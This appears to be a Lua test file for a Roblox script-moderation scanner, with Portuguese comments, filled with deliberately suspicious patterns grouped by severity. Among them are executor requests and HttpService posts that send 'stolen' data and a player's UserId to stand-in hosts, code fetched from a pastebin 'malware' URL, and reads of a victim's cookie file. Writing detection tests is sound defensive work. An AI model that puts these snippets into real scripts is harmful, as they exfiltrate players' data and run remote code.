-- ARQUIVO DE TESTE — usado para verificar se o sistema de moderação funciona
-- NÃO é um exploit real. Contém padrões que ativam as regras de detecção.

-- ── CRÍTICO: loadstring (execução remota) ────────────────────────────────────
local code = loadstring("print('hello from remote')")
code()

-- ── CRÍTICO: getfenv / setfenv (acesso ao ambiente global) ──────────────────
local env = getfenv(0)
setfenv(1, env)

-- ── CRÍTICO: debug hooks (exploit clássico) ──────────────────────────────────
debug.sethook(function() end, "c")
debug.setupvalue(print, 1, "hacked")

-- ── CRÍTICO: APIs de executor (Synapse X / Script-Ware) ─────────────────────
syn.request({
    Url = "https://webhook.site/malicious",
    Method = "POST",
    Body = "data=stolen"
})

-- ── CRÍTICO: getrawmetatable ─────────────────────────────────────────────────
local mt = getrawmetatable(game)
rawset(mt, "__index", function(t, k) return nil end)

-- ── ALTO: HTTP exfiltração de dados ─────────────────────────────────────────
local HttpService = game:GetService("HttpService")
local response = HttpService:PostAsync(
    "https://evil.example.com/collect",
    HttpService:JSONEncode({ userId = game.Players.LocalPlayer.UserId, data = "stolen" })
)

-- ── ALTO: criação dinâmica de scripts ────────────────────────────────────────
local s = Instance.new("LocalScript")
s.Source = loadstring(game:HttpGet("https://pastebin.com/raw/malware"))
s.Parent = game.Players.LocalPlayer.PlayerGui

-- ── ALTO: writefile / readfile (executor file system) ───────────────────────
writefile("C:/Users/victim/passwords.txt", "admin:1234")
local stolen = readfile("C:/Users/victim/cookies.txt")

-- ── MÉDIO: ofuscação com string.char ─────────────────────────────────────────
local obfuscated = string.char(104,101,108,108,111) -- "hello" ofuscado
local payload = table.concat({string.char(101,120,112,108,111,105,116)}, "")

-- ── MÉDIO: rawget / rawset bypass ────────────────────────────────────────────
local original = rawget(game, "Players")
rawset(game, "Players", nil)

-- ── MÉDIO: debug.getinfo ─────────────────────────────────────────────────────
local info = debug.getinfo(1)
print(info.source)

-- ── BAIXO: iteração sobre jogadores ──────────────────────────────────────────
for _, player in pairs(game.Players:GetPlayers()) do
    print(player.Name)
end
